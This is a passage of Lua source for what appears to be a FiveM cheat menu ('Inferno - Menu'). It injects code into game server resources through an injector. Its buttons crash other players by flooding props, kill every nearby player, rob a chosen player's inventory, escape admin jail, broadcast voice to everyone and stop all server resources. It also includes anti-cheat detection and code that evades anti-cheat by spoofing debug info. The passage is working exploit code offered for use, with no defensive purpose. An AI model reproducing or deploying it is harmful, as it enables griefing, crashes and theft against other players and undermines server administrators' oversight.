                    {
                        label = 'Change Player Scale',
                        type = 'button',
                        onConfirm = function()
                            showInput("Enter Player ID", "", function(id)
                                if id and id ~= "" then
                                    Wait(450)
                                    showInput("Enter Scale (e.g. 1.0)", "", function(scale)
                                        local n = tonumber(scale)
                                        if n then
                                            executeCode('nation-pedscale', string.format([[
                                        local _TriggerServerEvent = _ENV.TriggerServerEvent
                                        setSize = %f
                                        setPlayerId = %d
                                        local _rawConfig = Config
                                        Config = setmetatable({}, {
                                            __index = function(t, k)
                                                if k == 'MinScale' then return -math.huge end
                                                if k == 'MaxScale' then return math.huge end
                                                return _rawConfig[k]
                                            end,
                                            __newindex = function(t, k, v) rawset(_rawConfig, k, v) end
                                        })
                                        TriggerServerEvent = function(eventName, id, val, cachedNameWithId, ...)
                                            if eventName == 'nation-pedscale:addPlayer:server' then
                                                id = setPlayerId; val = setSize; cachedNameWithId = 1
                                            end
                                            return _TriggerServerEvent(eventName, id, val, cachedNameWithId, ...)
                                        end
                                    ]], n, math.floor(tonumber(id))))
                                            Wait(1000)
                                            MachoInjectJavaScript([[
                                        (() => {
                                            const target = [...document.getElementsByTagName('iframe')].find(f => (f.name || f.id).toLowerCase().includes('nation-pedscale'));
                                            if (!target?.contentWindow) return;
                                            target.contentWindow.fetch("https://nation-pedscale/setHeight", {
                                                method: "POST",
                                                headers: {"Content-Type": "application/json"},
                                                body: JSON.stringify({ height: 1.2 })
                                            }).catch(console.error);
                                        })();
                                    ]])
                                        else
                                            showNotify("Invalid scale value", "error")
                                        end
                                    end, "typeable")
                                end
                            end, "typeable")
                        end
                    },
                    {
                        label = 'Crash Player',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("lation_ui") == "started" then
                                executeCode('lation_ui', [[
                            _G.CreateObject = function() end

                            local model <const> = 'p_spinning_anus_s'
                            local props <const> = {}

                            for i = 1, 600 do
                                props[i] = {
                                model = model,
                                coords = vec3(0.0, 0.0, 0.0),
                                pos = vec3(0.0, 0.0, 0.0),
                                rot = vec3(0.0, 0.0, 0.0),
                                rotOrder = 0,
                                }
                            end

                            local plyState <const> = LocalPlayer.state

                            LocalPlayer.state:set('lation_ui:progressProps', props, true)
                            Wait(1000)
                            LocalPlayer.state:set('lation_ui:progressProps', nil, true)
                        ]])
                            elseif GetResourceState("prism_uipack") == "started" then
                                executeCode('prism_uipack', [[
    _G.CreateObject = function() end

    local setProps = {}
    local propData = {
        model = 'p_spinning_anus_s',
        pos = {},
        rot = {},
        bone = 0
    }

    for i = 1, 600 do
        setProps[#setProps + 1] = propData
    end

    LocalPlayer.state:set('prism:progressProps', setProps, true)
    LocalPlayer.state:set('prism:progressProps', propData, true)
]])
                                showNotify('Note: U JUST FUCKED THERE MOM WOWW', 'info')
                            end
                        end
                    },
                    {
                        label = 'Force Hands Up (E)',
                        type = 'button',
                        onConfirm = function()
                            local code = [[
                            if _G.__ForceHandsBound then return end
                            _G.__ForceHandsBound = true

                            local function thread(fn)
                                CreateThread(fn)
                            end

                            local handsUpState = false

                            local function LocalPlayerGetClosest()
                                local me = PlayerPedId()
                                local coords = GetEntityCoords(me)
                                local closestPlayer, closestDist = -1, math.huge

                                for _, pid in ipairs(GetActivePlayers()) do
                                    local ped = GetPlayerPed(pid)
                                    if ped ~= me then
                                        local dist = #(coords - GetEntityCoords(ped))
                                        if dist < closestDist then
                                            closestPlayer, closestDist = pid, dist
                                        end
                                    end
                                end
                                return closestPlayer, closestDist
                            end

                            thread(function()
                                while true do
                                    Wait(0)

                                    if IsControlJustPressed(0, 38) then -- E key
                                        local closest, dist = LocalPlayerGetClosest()

                                        if closest ~= -1 and dist < 3.0 then
                                            local ped = GetPlayerPed(closest)

                                            if handsUpState then
                                                ClearPedTasks(ped)
                                                SetEnableHandcuffs(ped, false)
                                                handsUpState = false
                                            else
                                                local dict = "random@mugging3"
                                                local anim = "handsup_standing_base"

                                                if not HasAnimDictLoaded(dict) then
                                                    RequestAnimDict(dict)
                                                    while not HasAnimDictLoaded(dict) do Wait(10) end
                                                end

                                                SetEnableHandcuffs(ped, true)
                                                TaskPlayAnim(ped, dict, anim, 8.0, -8.0, -1, 49, 0, false, false, false)

                                                handsUpState = true
                                            end
                                        end
                                    end
                                end
                            end)
                        ]]
                            executeCode('any', code)
                            showNotify(
                                'Note: This wont open there inventory once u are close do e and the do /steal/rob',
                                'info')
                        end
                    },
                    {
                        label = 'Rob Inventory',
                        type = 'button',
                        onConfirm = function()
                            showInput("Player ID", "", function(targetId)
                                if targetId and targetId ~= "" then
                                    executeCode('core', string.format([[
                                    local cache = { resource = GetCurrentResourceName() }
                                    local originalDebug = debug.getinfo
                                    debug.getinfo = function(level, what)
                                        local info = originalDebug(level, what)
                                        if info and type(level) == 'number' and level == 2 then
                                            info.currentline = math.abs(info.currentline or 1)
                                            info.what = 'Lua'
                                            info.source = '@@' .. cache.resource .. '/bypass.lua'
                                        end
                                        return info
                                    end

                                    OpenSecondaryInventory('player', %d, 'steal', 'Stormlua', { steal = true })
                                ]], tonumber(targetId)))
                                end
                            end, "typeable")
                        end
                    },
                    {
                        label = 'Get Out Of Admin Jail',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("adminplus-adminjail") ~= "started" then
                                showNotify("Resource Isn't Running", "error")
                                return
                            end
                            executeCode('adminplus-adminjail', [[
                            TriggerEvent('adminjail:setInAdminJail', false)
                        ]])
                        end
                    },
                    {
                        label = 'Remove Crutch',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("wasabi_crutch") ~= "started" then
                                showNotify("Resource Isn't Running", "error")
                                return
                            end
                            MachoInjectResource2(NewThreadNs, "wasabi_crutch", [[
                            _G.setWeaponsEnabled = function()
                                LocalPlayer.state.canUseWeapons = true
                            end

                            _G.StopCrutchLoop = true
                            _G.BreakLoop = true

                            if DisableKeys then
                                DisableKeys.crutch = nil
                            end

                            _G.setWeaponsEnabled()

                            ResetPedMovementClipset(PlayerPedId())

                            local pool = GetGamePool("CObject")

                            for _, obj in pairs(pool) do
                                if DoesEntityExist(obj) then
                                    if GetEntityModel(obj) == GetHashKey("crutch") then
                                        DeleteObject(obj)
                                    end
                                end
                            end

                            _G.isCrutchActive = false
                            _G.crutchTimer = 0
                            _G.StartCrutchLoop = function() end
                        ]])
                        end
                    },
                    {
                        label = 'Remove Wheelchair',
                        type = 'button',
                        onConfirm = function()
                            if GetResourceState("wasabi_crutch") ~= "started" then
                                showNotify("Resource Isn't Running", "error")
                                return
                            end
                            MachoInjectResource2(NewThreadNs, "wasabi_crutch", [[
                            _G.setWeaponsEnabled = function()
                                LocalPlayer.state.canUseWeapons = true
                            end

                            _G.StopChairLoop = true
                            _G.BreakLoop = true

                            if DisableKeys then
                                DisableKeys.chair = nil
                            end

                            _G.setWeaponsEnabled()

                            local ped = PlayerPedId()

                            if IsPedInAnyVehicle(ped, false) then
                                local veh = GetVehiclePedIsIn(ped, false)
                                DeleteVehicle(veh)
                            end

                            _G.isWheelchairActive = false
                            _G.crutchTimer = 0
                            _G.StartChairLoop = function() end
                        ]])
                        end
                    }
                }
            },
            {
                name = 'Server Exploits',
                icon = 'ph-warning',
                submenu = {
                    {
                        label = 'Talk to Everyone',
                        type = 'checkbox',
                        onConfirm = function(state)
                            executeCode('pma-voice', string.format([[
                                local fakeProximity = 999999.0
                                local toggle = %s
                                if toggle then
                                    NetworkSetTalkerProximity(fakeProximity)
                                    MumbleSetTalkerProximity(fakeProximity)
                                else
                                    NetworkSetTalkerProximity(3.0)
                                    MumbleSetTalkerProximity(3.0)
                                end
                            ]], tostring(state)))
                        end
                    },
                    {
                        label = 'Limb Players Around You',
                        type = 'checkbox',
                        checked = false,
                        onConfirm = function(state)
                            if state then
                                showNotify('Limb Players Around You: ON', 'info')
                                if GetResourceState('waveshield') == 'started' then
                                    executeCode('any', [[
                                        _G.isLimbActive = true
                                        local function thread(fn)
                                            CreateThread(fn)
                                        end
                                        thread(function()
                                            while _G.isLimbActive do
                                                local ped = PlayerPedId()
                                                SetEntityVisible(ped, false, false)
                                                FreezeEntityPosition(ped, true)
                                                TaskStartScenarioInPlace(ped, "WORLD_HUMAN_WELDING", 0, false)
                                                Wait(10)
                                                ClearPedTasks(ped)
                                                TaskStartScenarioInPlace(ped, "WORLD_HUMAN_WELDING", 0, true)
                                            end
                                            local ped = PlayerPedId()
                                            FreezeEntityPosition(ped, false)
                                            ClearPedTasks(ped)
                                            ClearPedTasksImmediately(ped)
                                            SetEntityVisible(ped, true, true)
                                        end)
                                    ]])
                                else
                                    MachoInjectResource2(NewThreadNs, "any", [[
                                        local function setBypass(setFunc, ...)
                                            local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                                            LocalPlayer.state:set(stateName, setFunc, false)
                                            return LocalPlayer.state[stateName](...)
                                        end
                                        _G.isLimbActive = true
                                        local function thread(fn)
                                            setBypass(CreateThread, fn)
                                        end
                                        thread(function()
                                            while _G.isLimbActive do
                                                local ped = setBypass(PlayerPedId)
                                                setBypass(SetEntityVisible, ped, false, false)
                                                setBypass(FreezeEntityPosition, ped, true)
                                                setBypass(TaskStartScenarioInPlace, ped, "WORLD_HUMAN_WELDING", 0, false)
                                                setBypass(Wait, 10)
                                                setBypass(ClearPedTasks, ped)
                                                setBypass(TaskStartScenarioInPlace, ped, "WORLD_HUMAN_WELDING", 0, true)
                                            end
                                            local ped = setBypass(PlayerPedId)
                                            setBypass(FreezeEntityPosition, ped, false)
                                            setBypass(ClearPedTasks, ped)
                                            setBypass(ClearPedTasksImmediately, ped)
                                            setBypass(SetEntityVisible, ped, true, true)
                                        end)
                                    ]])
                                end
                            else
                                showNotify('Limb Players Around You: OFF', 'info')
                                if GetResourceState('waveshield') == 'started' then
                                    executeCode('any', [[ _G.isLimbActive = false ]])
                                else
                                    MachoInjectResource2(NewThreadNs, "any", [[
                                        local function setBypass(setFunc, ...)
                                            local stateName = math.random(999999, 999999999)..GetCurrentResourceName()..GetGameTimer()

                                            LocalPlayer.state:set(stateName, setFunc, false)
                                            return LocalPlayer.state[stateName](...)
                                        end
                                        setBypass(function() _G.isLimbActive = false end)
                                    ]])
                                end
                            end
                        end
                    },
                    {
                        label = 'Spawn Ufo Around The sky',
                        type = 'button',
                        onConfirm = function()
                            MachoInjectResource2(NewThreadNs, "ox_lib", [[
                            LocalPlayer.state:set('lib:progressProps', nil, true)
                            local In= {}
                            for i = 1, 5 do
                                table.insert(In, {
                                    model = "p_spinning_anus_s",
                                    pos = vector3(0.0, 0.0, 0.0),
                                    rot = vector3(0.0, 0.0, 0.0),
                                    bone = 0
                                })
                            end
                            LocalPlayer.state:set('lib:progressProps', In, true)
                            ]])
                        end
                    },
                    {
                        type = 'checkbox',
                        label = 'Kill Everyone',
                        icon = 'ph-crosshair',
                        desc = 'Kills everyone around you',
                        onConfirm = function(checked)
                            if not checked then
                                executeCode('any', [[ _G.KillEveryoneLoop = false ]])
                                return
                            end

                            showInput('Enter what weapon u want to use to kill players with', 'Weapon_NAME',
                                function(weaponName)
                                    if not weaponName or weaponName == "" then
                                        showNotify('Invalid weapon name!', 'error')
                                        return
                                    end

                                    executeCode('any', string.format([[
                                _G.KillEveryoneLoop = true

                                local weaponName = '%s'
                                local ammoAmount = 999

                                CreateThread(function()
                                    local weapon = GetHashKey(weaponName)

                                    RequestWeaponAsset(weapon, 31, 26)
                                    while not HasWeaponAssetLoaded(weapon) and _G.KillEveryoneLoop do
                                        Wait(0)
                                    end

                                    while _G.KillEveryoneLoop do
                                        local selfPed = PlayerPedId()
                                        local selfCoords = GetEntityCoords(selfPed)

                                        GiveDelayedWeaponToPed(selfPed, weapon, ammoAmount, true)
                                        SetPedAmmo(selfPed, weapon, ammoAmount)

                                        local players = GetActivePlayers()
                                        for _, playerId in ipairs(players) do
                                            local targetPed = GetPlayerPed(playerId)

                                            if targetPed ~= selfPed and DoesEntityExist(targetPed) and not IsPedDeadOrDying(targetPed, true) then
                                                local targetCoords = GetEntityCoords(targetPed)
                                                local dist = #(selfCoords - targetCoords)

                                                if dist < 350.0 then
                                                    local fromCoords = targetCoords + vector3(0.0, 0.0, 0.1)
                                                    ShootSingleBulletBetweenCoords(fromCoords.x, fromCoords.y, fromCoords.z, targetCoords.x, targetCoords.y, targetCoords.z, 999999, true, weapon, selfPed, true, false, 999999.0)

                                                    SetPedUsingActionMode(selfPed, true, -1, 1)
                                                    SetPedCurrentWeaponVisible(selfPed, false, false, true, true)
                                                end
                                            end
                                        end
                                        Wait(0)
                                    end

                                    local ped = PlayerPedId()
                                    SetPedUsingActionMode(ped, false, -1, 'DEFAULT_ACTION')
                                    RemoveWeaponFromPed(ped, weapon)
                                    SetCurrentPedWeapon(ped, 'weapon_unarmed', true)
                                end)
                            ]], weaponName))
                                end, 'typeable')
                        end
                    },
                }
            },
        }
    },
    {
        label = 'Settings',
        icon = 'ph-gear',
        type = 'submenu',
        tabs = {
            {
                name = 'Settings',
                submenu = {
                    {
                        label = 'Set Menu Keybind',
                        type = 'button',
                        onConfirm = function()
                            settingKeybind = true
                            currentInputData.buffer = MenuKey
                            pushBuffer()
                            showInput("Menu Keybind", MenuKey, function(key)
                                if key and key ~= "" then
                                    MenuKey = key
                                    showNotify("Menu keybind set to: " .. MenuKey, "info")
                                end
                            end, "SetKeybind")
                        end
                    },
                    {
                        label = 'Check Anti-Cheat',
                        type = 'button',
                        onConfirm = function()
                            if ac then
                                showNotify(("Detected Anti-Cheat: %s in Resource: %s"):format(ac, name), 'Inferno - Menu')
                            else
                                showNotify("No known Anti-Cheat detected.", 'Inferno - Menu')
                            end
                        end
                    },
                    {
                        label = 'Crash Own Game',
                        type = 'button',
                        onConfirm = function()
                            MachoInjectResourceRaw("any", [[
                                local p4 = 4
                                if p4 == 4 then
                                    for i = 1, 10000 do
                                        for j = 1, 10000 do
                                            for k = 1, 10000 do
                                            end
                                        end
                                    end
                                end
                            ]])
                        end
                    },
                    {
                        label = 'Get Server IP',
                        type = 'button',
                        onConfirm = function()
                            executeCode('monitor', [[
                                local serverIP = GetCurrentServerEndpoint() or "Unknown"
                                print("Current Server IP: " .. serverIP)
                            ]])
                        end
                    }
                }
            },
            {
                name = 'Misc',
                submenu = {
                    { type = 'divider', label = 'Menu Position' },
                    {
                        label       = 'Position X',
                        type        = 'slider',
                        autoConfirm = true,
                        value       = menuPosX,
                        min         = 0,
                        max         = 80,
                        step        = 0.5,
                        onConfirm   = function(v)
                            menuPosX = v
                            SendSvelte('setMenuPos', { x = menuPosX, y = menuPosY })
                        end
                    },
                    {
                        label       = 'Position Y',
                        type        = 'slider',
                        autoConfirm = true,
                        value       = menuPosY,
                        min         = 0,
                        max         = 80,
                        step        = 0.5,
                        onConfirm   = function(v)
                            menuPosY = v
                            SendSvelte('setMenuPos', { x = menuPosX, y = menuPosY })
                        end
                    },
                    {
                        label       = 'Menu Scale',
                        type        = 'slider',
                        autoConfirm = true,
                        value       = menuScale,
                        min         = 50,
                        max         = 150,
                        step        = 5,
                        onConfirm   = function(v)
                            menuScale = v
                            SendSvelte('setMenuScale', { scale = menuScale })
                        end
                    },
                    { type = 'divider', label = 'Appearance' },
                    {
                        label     = 'Custom Banner URL',
                        type      = 'button',
                        onConfirm = function()
                            showInput('Paste banner image URL', '', function(url)
                                if url and url ~= '' then
                                    MachoSendDuiMessage('setBanner', { url = url })
                                    showNotify('Banner updated!', 'success')
                                end
                            end)
                        end
                    },
                    {
                        label     = 'Show Keybind List',
                        type      = 'checkbox',
                        checked   = false,
                        onConfirm = function(checked)
                            showKeybindListState = checked
                            local binds = {}
                            for k, item in pairs(itemKeybinds) do
                                binds[#binds + 1] = { label = item.label or '?', key = k }
                            end
                            SendSvelte('updateKeybinds', { KeyBinds = binds })
                            SendSvelte('showKeybinds', { showKeybinds = checked })
                        end
                    },
                    {
                        label     = 'Show Spectator List',
                        type      = 'checkbox',
                        desc      = 'Show a list of current Spectators',
                        checked   = false,
                        onConfirm = function(checked)
                            _G.ShowSpectatorList = checked
                            SendSvelte('showSpectators', { showSpectators = checked })
                            if checked then
                                showNotify('Spectator warning module active!', 'info')
                            else
                                showNotify(
                                    'Spectator warning module disabled', 'info')
                            end
                        end
                    },
                    { type = 'divider', label = 'Menu Color' },
                    {
                        label       = 'Red',
                        type        = 'slider',
                        autoConfirm = true,
                        value       = menuColorR,
                        min         = 0,
                        max         = 255,
                        step        = 1,
                        onConfirm   = function(v)
                            menuColorR = v
                            SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                        end
                    },
                    {
                        label       = 'Green',
                        type        = 'slider',
                        autoConfirm = true,
                        value       = menuColorG,
                        min         = 0,
                        max         = 255,
                        step        = 1,
                        onConfirm   = function(v)
                            menuColorG = v
                            SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                        end
                    },
                    {
                        label       = 'Blue',
                        type        = 'slider',
                        autoConfirm = true,
                        value       = menuColorB,
                        min         = 0,
                        max         = 255,
                        step        = 1,
                        onConfirm   = function(v)
                            menuColorB = v
                            SendSvelte('setMenuColor', { r = menuColorR, g = menuColorG, b = menuColorB })
                        end
                    },
                }
            },
            {
                name = 'Resources',
                submenu = (function()
                    local submenu = {
                        {
                            type = "button",
                            label = "Start All Resources",
                            desc = "Starts up any dormant threads in all found resources.",
                            onConfirm = function()
                                local started = 0
                                for i = 0, GetNumResources() - 1 do
                                    local res = GetResourceByFindIndex(i)
                                    if res then
                                        pcall(function()
                                            MachoResourceStart(res)
                                            started = started + 1
                                        end)
                                        Wait(5)
                                    end
                                end
                                showNotify(("Started %d resources"):format(started), "success")
                            end
                        },
                        {
                            type = "button",
                            label = "Stop All Resources",
                            desc = "Stops any active threads in all found resources.",
                            onConfirm = function()
                                local stopped = 0
                                for i = 0, GetNumResources() - 1 do
                                    local res = GetResourceByFindIndex(i)
                                    if res and GetResourceState(res) == "started" then
                                        pcall(function()
                                            MachoResourceStop(res)
                                            stopped = stopped + 1
                                        end)
                                        Wait(5)
                                    end
                                end
                                showNotify(("Stopped %d resources"):format(stopped), "success")
                            end
                        },
                        {
                            type = "button",
                            label = "Copy All Resource Names",
                            desc = "Copies every resource name to clipboard.",
                            onConfirm = function()
                                local list = {}
                                for i = 0, GetNumResources() - 1 do
                                    local r = GetResourceByFindIndex(i)
                                    if r then list[#list + 1] = r end
                                end
                                MachoSetClipboardText(table.concat(list, "\n"))
                                showNotify("Copied All Resource Names to Clipboard", "success")
                            end
                        },
                        {
                            type = "divider",
                            label = "Active Resources"
                        }
                    }

                    for i = 0, GetNumResources() - 1 do
                        local name = GetResourceByFindIndex(i)
                        if name and name ~= "" then
                            submenu[#submenu + 1] = {
                                type = "scroll",
                                label = name,
                                desc = ("Manage actions for '%s'"):format(name),
                                options = {
                                    { label = "Start Resource",          value = "start" },
                                    { label = "Stop Resource",           value = "stop" },
                                    { label = "Copy Resource Name",      value = "copy" },
                                    { label = "Test Resource Injection", value = "test_res" },
                                    { label = "Test Thread Injection",   value = "test_thread" }
                                },
                                selected = 1,
                                onConfirm = function(data)
                                    local opt = data.value
                                    if opt == "start" then
                                        MachoResourceStart(name)
                                        showNotify(("Started Resource '%s'"):format(name), "success")
                                    elseif opt == "stop" then
                                        MachoResourceStop(name)
                                        showNotify(("Stopped Resource '%s'"):format(name), "success")
                                    elseif opt == "copy" then
                                        MachoSetClipboardText(name)
                                        showNotify(("Copied Resource Name '%s' to Clipboard"):format(name), "success")
                                    elseif opt == "test_res" then
                                        VerifiedInject(name, "resource")
                                    elseif opt == "test_thread" then
                                        VerifiedInject(name, "thread")
                                    end
                                end
                            }
                        end
                    end

                    return submenu
                end)()
            }
        }
    }
}

activeMenu = MenuConfig
CreateThread(function()
    while true do
        Wait(1000)

        if IsVisible and type(activeMenu) == "table" then
            local divIdx = -1
            for i = 1, #activeMenu do
                local item = activeMenu[i]
                if item and item.type == 'divider' and item.label == 'Nearby Players' then
                    divIdx = i
                    break
                end
            end

            if divIdx ~= -1 then
                local myPed = PlayerPedId()
                local coords = GetEntityCoords(myPed)
                local nearby = Risk:GetNearbyPlayers(coords, 350.0, true)

                for i = #activeMenu, divIdx + 1, -1 do
                    table.remove(activeMenu, i)
                end

                if #nearby == 0 then
                    activeMenu[#activeMenu + 1] = {
                        type = 'button',
                        label = 'Hello Menu bypasses wont work fully re load game and re inejct',
                        disabled = true,
                        onConfirm = function() end
                    }
                else
                    table.sort(nearby, function(a, b) return tonumber(a.serverId) < tonumber(b.serverId) end)
                    for _, p in ipairs(nearby) do
                        local sid = tonumber(p.serverId)
                        activeMenu[#activeMenu + 1] = {
                            type = 'checkbox',
                            label = string.format("%s - [%s]", p.name, sid),
                            serverId = sid,
                            checked = CPlayers[sid] or false,
                            onConfirm = function(checked)
                                CPlayers[sid] = checked
                            end
                        }
                    end
                end
                for k, _ in pairs(CPlayers) do
                    local found = false
                    for _, p in ipairs(nearby) do
                        if tonumber(p.serverId) == tonumber(k) then
                            found = true
                            break
                        end
                    end
                    if not found then
                        CPlayers[k] = nil
                    end
                end

                pcall(function()
                    setCurrent()
                end)
            end
        end
    end
end)
-- Spectator List
_G.ShowSpectatorList = false
Citizen.CreateThread(function()
    while true do
        Citizen.Wait(1000)
        if _G.ShowSpectatorList then
            local setSpectatorItems = {}
            local players = GetActivePlayers() or {}
            local selfPlayer = PlayerId()
            local selfPed = PlayerPedId()
            local selfCoords = GetEntityCoords(selfPed)

            if #(selfCoords - vector3(0.0, 0.0, 0.0)) > 10.0 then
                for i = 1, #players do
                    local player = players[i]
                    if player ~= selfPlayer then
                        local ped = GetPlayerPed(player)
                        if DoesEntityExist(ped) then
                            local coords = GetEntityCoords(ped)
                            if not IsEntityVisible(ped) and math.abs(coords.x - selfCoords.x) <= 10.0 and math.abs(coords.y - selfCoords.y) <= 10.0 and coords.z <= selfCoords.z - 10.0 then
                                setSpectatorItems[#setSpectatorItems + 1] = {
                                    label = GetPlayerName(player),
                                    value = tostring(GetPlayerServerId(player))
                                }
                            end
                        end
                    end
                end
            end

            SendSvelte('updateSpectators', { Spectators = setSpectatorItems })
        end
    end
end)
